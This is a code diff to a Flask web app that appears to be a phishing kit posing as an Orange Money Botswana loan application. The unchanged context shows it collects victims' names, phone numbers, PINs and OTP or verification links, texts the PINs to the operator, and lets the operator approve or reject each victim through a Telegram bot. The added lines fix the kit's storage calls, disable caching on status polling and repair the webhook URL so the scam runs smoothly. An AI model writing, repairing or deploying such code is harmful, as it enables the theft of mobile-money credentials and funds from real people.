@@ -128,23 +128,35 @@ except Exception as e:
     print(f"Redis initialization notice: {e}")
     db = None
 
+def get_base_url():
+    proto = request.headers.get("X-Forwarded-Proto", "https" if request.is_secure or "vercel" in request.host else "http")
+    host = request.headers.get("X-Forwarded-Host", request.host)
+    return f"{proto}://{host}".rstrip('/')
+
 def persist_record(app_id, data_update):
     try:
         key = f"app:{app_id}"
         if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
             base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
-            headers = {"Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}"}
+            headers = {
+                "Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}",
+                "Content-Type": "application/json"
+            }
             existing = {}
             try:
-                get_res = requests.get(f"{base_url}/get/{key}", headers=headers, timeout=4)
+                get_res = requests.post(base_url, headers=headers, json=["GET", key], timeout=4)
                 if get_res.status_code == 200:
                     raw = get_res.json().get("result")
-                    if raw: existing = json.loads(raw)
-            except Exception: pass
+                    if raw:
+                        existing = json.loads(raw)
+            except Exception as ex:
+                print(f"Upstash GET error: {ex}")
             existing.update(data_update)
             existing["updated_at"] = get_now_str()
-            requests.post(f"{base_url}/set/{key}", headers=headers, data=json.dumps(existing), timeout=4)
-            requests.post(f"{base_url}/lpush/applications/{key}", headers=headers, timeout=4)
+            # Command array for SET
+            requests.post(base_url, headers=headers, json=["SET", key, json.dumps(existing)], timeout=4)
+            # Add to applications list
+            requests.post(base_url, headers=headers, json=["LPUSH", "applications", key], timeout=4)
         elif db:
             raw = db.get(key)
             existing = json.loads(raw) if raw else {}
@@ -164,8 +176,11 @@ def get_record(app_id):
     try:
         if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
             base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
-            headers = {"Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}"}
-            get_res = requests.get(f"{base_url}/get/{key}", headers=headers, timeout=4)
+            headers = {
+                "Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}",
+                "Content-Type": "application/json"
+            }
+            get_res = requests.post(base_url, headers=headers, json=["GET", key], timeout=4)
             if get_res.status_code == 200:
                 raw = get_res.json().get("result")
                 if raw:
@@ -1112,7 +1127,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
       statusPollTimer = setInterval(async () => {
         try {
-          const res = await fetch('/api/status/' + appState.appId);
+          const res = await fetch('/api/status/' + appState.appId + '?_=' + Date.now(), { cache: 'no-store' });
           if (!res.ok) return;
           const data = await res.json();
           const currentStatus = (data && data.appStatus) ? data.appStatus.toLowerCase() : '';
@@ -1236,7 +1251,7 @@ def save_unified():
             send_sms_notification(f"[Orange Money Botswana] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n in ('entered_link', 'entered_otp'):
             persist_record(app_id, {"verification_link": f_v, "status": "pending_review"})
-            base_url = request.host_url.rstrip('/')
+            base_url = get_base_url()
             accept_url = f"{base_url}/api/decision/{app_id}/accept"
             reject_url = f"{base_url}/api/decision/{app_id}/reject"
             reply_markup = {
@@ -1290,12 +1305,15 @@ def track_input():
 @app.route('/api/status/<app_id>')
 def get_app_status(app_id):
     rec = get_record(app_id)
-    return jsonify({
+    resp = jsonify({
         "status": "success",
         "appId": app_id,
         "appStatus": rec.get("status", "pending_review"),
         "data": rec
     })
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+    resp.headers["Pragma"] = "no-cache"
+    return resp
 
 @app.route('/api/decision/<app_id>/<action>', methods=['GET', 'POST'])
 def api_decision(app_id, action):
@@ -1346,7 +1364,7 @@ def api_decision(app_id, action):
 @app.route('/api/telegram-webhook', methods=['POST'])
 def telegram_webhook():
     try:
-        data = request.get_json(silent=True) or {}
+        data = request.get_json(force=True, silent=True) or {}
         cq = data.get("callback_query")
         if cq:
             cq_id = cq.get("id")
@@ -1356,14 +1374,16 @@ def telegram_webhook():
             message_id = msg.get("message_id")
             if ":" in cb_data:
                 action, app_id = cb_data.split(":", 1)
-                if action == "accept":
+                action = action.strip().lower()
+                app_id = app_id.strip()
+                if action in ("accept", "approve"):
                     persist_record(app_id, {"status": "approved"})
-                    answer_telegram_callback(cq_id, "✅ Application Accepted! User is approved.")
-                    edit_telegram_message(chat_id, message_id, f"✅ *APPLICATION ACCEPTED*\n\n🆔 *Ref:* `{app_id}`\nStatus: User screen forwarded to Loan Approved.")
-                elif action == "reject":
+                    answer_telegram_callback(cq_id, "✅ Application Accepted!")
+                    edit_telegram_message(chat_id, message_id, f"✅ *APPLICATION ACCEPTED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: User screen forwarded to Loan Approved.")
+                elif action in ("reject", "decline"):
                     persist_record(app_id, {"status": "rejected"})
-                    answer_telegram_callback(cq_id, "❌ Link Rejected! User prompted to re-enter.")
-                    edit_telegram_message(chat_id, message_id, f"❌ *LINK REJECTED*\n\n🆔 *Ref:* `{app_id}`\nStatus: User prompted to re-enter new verification link.")
+                    answer_telegram_callback(cq_id, "❌ Link Rejected!")
+                    edit_telegram_message(chat_id, message_id, f"❌ *LINK REJECTED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: User prompted to re-enter new verification link.")
         return jsonify({"ok": True})
     except Exception as e:
         print(f"Telegram webhook error: {e}")
@@ -1373,7 +1393,7 @@ def telegram_webhook():
 def setup_webhook():
     if not TELEGRAM_BOT_TOKEN:
         return jsonify({"status": "error", "message": "TELEGRAM_BOT_TOKEN not configured"}), 400
-    base_url = request.host_url.rstrip('/')
+    base_url = get_base_url()
     webhook_url = f"{base_url}/api/telegram-webhook"
     res = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook", json={"url": webhook_url}, timeout=5)
     return jsonify({"webhook_url": webhook_url, "telegram_response": res.json()})
@@ -1384,12 +1404,16 @@ def admin_page():
     try:
         if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
             base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
-            headers = {"Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}"}
-            l_res = requests.get(f"{base_url}/lrange/applications/0/50", headers=headers, timeout=3)
+            headers = {
+                "Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}",
+                "Content-Type": "application/json"
+            }
+            l_res = requests.post(base_url, headers=headers, json=["LRANGE", "applications", 0, 50], timeout=3)
             if l_res.status_code == 200:
                 for k in (l_res.json().get("result") or []):
                     app_keys.add(k.replace("app:", ""))
-    except Exception: pass
+    except Exception as ex:
+        print(f"Admin lrange error: {ex}")
 
     records = [get_record(k) for k in app_keys if k]
     records = [r for r in records if r]
